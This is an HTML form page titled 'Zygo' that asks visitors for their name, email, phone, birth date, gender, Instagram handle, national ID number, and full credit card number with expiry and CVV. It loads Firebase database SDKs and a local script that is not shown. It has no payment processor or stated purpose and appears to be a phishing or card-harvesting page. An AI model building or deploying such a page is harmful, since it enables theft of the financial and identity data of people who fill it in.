<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <title>Zygo</title>
</head>
<body>

<h1>Enter Details</h1>

<form id="nameForm">

    <input type="text" id="firstName" placeholder="Family Name" required><br><br>
    <input type="text" id="lastName" placeholder="Last Name" required><br><br>

    <input type="email" id="email" placeholder="Email" required><br><br>

    <input type="number" id="phoneNumber" placeholder="Phone Number" required><br><br>

    <input type="date" id="birthDate" required><br><br>

    <select id="gender" required>
        <option value="">Gender</option>
        <option value="male">Male</option>
        <option value="female">Female</option>
        <option value="other">Other</option>
    </select><br><br>

    <input type="text" id="instagram" placeholder="Instagram"><br><br>

    <input type="number" id="ID" placeholder="ID" required><br><br>

    <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required><br><br>

    <input type="text" id="expire" placeholder="Expire (MM/YY)" required><br><br>

    <input type="number" id="cvv" placeholder="CVV" required><br><br>

    <button type="submit">Submit</button>

</form>

<!-- Firebase SDKs -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<!-- Your JS (MUST be defer) -->
<script src="firebase.js" defer></script>

</body>
</html>
